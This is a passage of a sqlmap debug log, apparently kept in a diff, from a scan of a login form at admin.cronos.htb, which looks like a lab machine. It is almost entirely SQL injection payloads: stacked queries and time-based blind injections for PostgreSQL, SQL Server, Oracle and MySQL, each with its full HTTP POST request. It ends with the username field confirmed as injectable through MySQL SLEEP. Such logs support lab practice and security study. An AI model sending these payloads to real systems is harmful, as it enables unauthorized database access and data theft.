+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)' because the level (3) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL >= 5.0.12 stacked queries (query SLEEP)' because the level (4) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:24] [DEBUG] skipping test 'MySQL < 5.0.12 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[18:32:24] [PAYLOAD] user');SELECT PG_SLEEP(5)--
+[18:32:24] [TRAFFIC OUT] HTTP request [#34]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 61
+Connection: close
+
+username=user%27%29%3BSELECT%20PG_SLEEP%285%29--&password=bla
+
+[18:32:24] [PAYLOAD] user';SELECT PG_SLEEP(5)--
+[18:32:24] [TRAFFIC OUT] HTTP request [#35]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 58
+Connection: close
+
+username=user%27%3BSELECT%20PG_SLEEP%285%29--&password=bla
+
+[18:32:25] [PAYLOAD] user);SELECT PG_SLEEP(5)--
+[18:32:25] [TRAFFIC OUT] HTTP request [#36]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 58
+Connection: close
+
+username=user%29%3BSELECT%20PG_SLEEP%285%29--&password=bla
+
+[18:32:25] [PAYLOAD] user;SELECT PG_SLEEP(5)--
+[18:32:25] [TRAFFIC OUT] HTTP request [#37]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 55
+Connection: close
+
+username=user%3BSELECT%20PG_SLEEP%285%29--&password=bla
+
+[18:32:25] [DEBUG] skipping test 'PostgreSQL > 8.1 stacked queries' because the level (4) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'PostgreSQL stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc - comment)' because the level (3) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'PostgreSQL < 8.2 stacked queries (Glibc)' because the level (5) is higher than the provided (1)
+[18:32:25] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[18:32:25] [PAYLOAD] user');WAITFOR DELAY '0:0:5'--
+[18:32:25] [TRAFFIC OUT] HTTP request [#38]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 70
+Connection: close
+
+username=user%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=bla
+
+[18:32:25] [PAYLOAD] user';WAITFOR DELAY '0:0:5'--
+[18:32:25] [TRAFFIC OUT] HTTP request [#39]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 67
+Connection: close
+
+username=user%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=bla
+
+[18:32:25] [PAYLOAD] user);WAITFOR DELAY '0:0:5'--
+[18:32:25] [TRAFFIC OUT] HTTP request [#40]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 67
+Connection: close
+
+username=user%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=bla
+
+[18:32:25] [PAYLOAD] user;WAITFOR DELAY '0:0:5'--
+[18:32:25] [TRAFFIC OUT] HTTP request [#41]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 64
+Connection: close
+
+username=user%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=bla
+
+[18:32:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)' because the level (2) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries' because the level (4) is higher than the provided (1)
+[18:32:25] [DEBUG] skipping test 'Microsoft SQL Server/Sybase stacked queries (DECLARE)' because the level (5) is higher than the provided (1)
+[18:32:25] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[18:32:25] [PAYLOAD] user');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(81)||CHR(120)||CHR(109),5) FROM DUAL--
+[18:32:25] [TRAFFIC OUT] HTTP request [#42]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 160
+Connection: close
+
+username=user%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2881%29%7C%7CCHR%28120%29%7C%7CCHR%28109%29%2C5%29%20FROM%20DUAL--&password=bla
+
+[18:32:26] [PAYLOAD] user';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(81)||CHR(120)||CHR(109),5) FROM DUAL--
+[18:32:26] [TRAFFIC OUT] HTTP request [#43]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 157
+Connection: close
+
+username=user%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2881%29%7C%7CCHR%28120%29%7C%7CCHR%28109%29%2C5%29%20FROM%20DUAL--&password=bla
+
+[18:32:26] [PAYLOAD] user);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(81)||CHR(120)||CHR(109),5) FROM DUAL--
+[18:32:26] [TRAFFIC OUT] HTTP request [#44]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 157
+Connection: close
+
+username=user%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2881%29%7C%7CCHR%28120%29%7C%7CCHR%28109%29%2C5%29%20FROM%20DUAL--&password=bla
+
+[18:32:26] [PAYLOAD] user;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(117)||CHR(81)||CHR(120)||CHR(109),5) FROM DUAL--
+[18:32:26] [TRAFFIC OUT] HTTP request [#45]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 154
+Connection: close
+
+username=user%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28117%29%7C%7CCHR%2881%29%7C%7CCHR%28120%29%7C%7CCHR%28109%29%2C5%29%20FROM%20DUAL--&password=bla
+
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)' because the level (4) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)' because the level (4) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (DBMS_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP - comment)' because the level (5) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Oracle stacked queries (USER_LOCK.SLEEP)' because the level (5) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'IBM DB2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'SQLite > 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Firebird stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'Firebird stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'SAP MaxDB stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'HSQLDB >= 1.7.2 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query - comment)' because the risk (2) is higher than the provided (1)
+[18:32:26] [DEBUG] skipping test 'HSQLDB >= 2.0 stacked queries (heavy query)' because the risk (2) is higher than the provided (1)
+[18:32:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[18:32:26] [PAYLOAD] user') AND (SELECT 7682 FROM (SELECT(SLEEP(5)))itpD) AND ('zqAj'='zqAj
+[18:32:26] [TRAFFIC OUT] HTTP request [#46]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 136
+Connection: close
+
+username=user%27%29%20AND%20%28SELECT%207682%20FROM%20%28SELECT%28SLEEP%285%29%29%29itpD%29%20AND%20%28%27zqAj%27%3D%27zqAj&password=bla
+
+[18:32:26] [PAYLOAD] user' AND (SELECT 7682 FROM (SELECT(SLEEP(5)))itpD) AND 'EvFR'='EvFR
+[18:32:26] [TRAFFIC OUT] HTTP request [#47]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 130
+Connection: close
+
+username=user%27%20AND%20%28SELECT%207682%20FROM%20%28SELECT%28SLEEP%285%29%29%29itpD%29%20AND%20%27EvFR%27%3D%27EvFR&password=bla
+
+[18:32:32] [PAYLOAD] user' AND (SELECT 7682 FROM (SELECT(SLEEP(0)))itpD) AND 'EvFR'='EvFR
+[18:32:32] [TRAFFIC OUT] HTTP request [#48]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 130
+Connection: close
+
+username=user%27%20AND%20%28SELECT%207682%20FROM%20%28SELECT%28SLEEP%280%29%29%29itpD%29%20AND%20%27EvFR%27%3D%27EvFR&password=bla
+
+[18:32:32] [PAYLOAD] user' AND (SELECT 7682 FROM (SELECT(SLEEP(5)))itpD) AND 'EvFR'='EvFR
+[18:32:32] [TRAFFIC OUT] HTTP request [#49]:
+POST / HTTP/1.1
+Host: admin.cronos.htb
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Referer: http://admin.cronos.htb/
+Content-type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=odj7vfna274jqakpqf3ffpjo87
+Upgrade-Insecure-Requests: 1
+Content-length: 130
+Connection: close
+
+username=user%27%20AND%20%28SELECT%207682%20FROM%20%28SELECT%28SLEEP%285%29%29%29itpD%29%20AND%20%27EvFR%27%3D%27EvFR&password=bla
+
+[18:32:37] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+[18:35:21] [ERROR] user quit
+
+[*] ending @ 18:35:21 /2020-05-20/
+
